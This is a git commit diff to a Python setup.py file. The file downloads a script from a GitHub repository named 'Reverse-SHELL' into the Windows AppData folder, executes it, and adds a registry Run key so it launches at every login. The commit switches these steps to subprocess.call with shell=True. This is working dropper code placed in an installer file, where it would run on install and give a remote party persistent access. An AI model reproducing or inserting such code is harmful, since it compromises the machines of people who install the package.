c7fe7bd2a6bb6c3c55d80508a5c4121430f67f20
Muzaffar Sharofitdinov <smartboymuzaffar@gmail.com>
2024-04-27 04:32:44 +0900

    Update setup.py

--- setup.py
+++ setup.py
@@ -5,17 +5,16 @@ path = os.environ['appdata']
 file_path = path = os.environ['appdata'] + '\\client.pyw'
 
 ################################################ setup #################################################################
-powershell_command = (f'powershell invoke-webrequest -uri "https://raw.githubusercontent.com/SmartBoyMuzaffar/Reverse'
-                      f'-SHELL/master/client.py" -outfile "{path}\\client.pyw"')
-subprocess.run(["powershell", "-Command", powershell_command], capture_output=True, text=True)
+powershell_command = (f'powershell invoke-webrequest -uri "https://raw.githubusercontent.com/SmartBoyMuzaffar/Reverse-SHELL/master/client.py" -outfile "{path}\\client.pyw"')
+#subprocess.run(["powershell", "-Command", powershell_command], capture_output=True, text=True)
+subprocess.call(powershell_command, shell=True)
 
 powershell_command = f'powershell.exe {path}\\client.pyw'
-subprocess.run(["powershell", "-Command", powershell_command], capture_output=True, text=True)
+# subprocess.run(["powershell", "-Command", powershell_command], capture_output=True, text=True)
+subprocess.call(powershell_command, shell=True)
 
 powershell_command = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v client /t REG_SZ /d "' + file_path + '"'
-subprocess.run(["powershell", "-Command", powershell_command], capture_output=True, text=True)
+# subprocess.run(["powershell", "-Command", powershell_command], capture_output=True, text=True)
+subprocess.call(powershell_command, shell=True)
 
-# subprocess.call(
-#             'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v client /t REG_SZ /d "' + file_path + '"',
-#             shell=True)
 ################################################ done ##################################################################
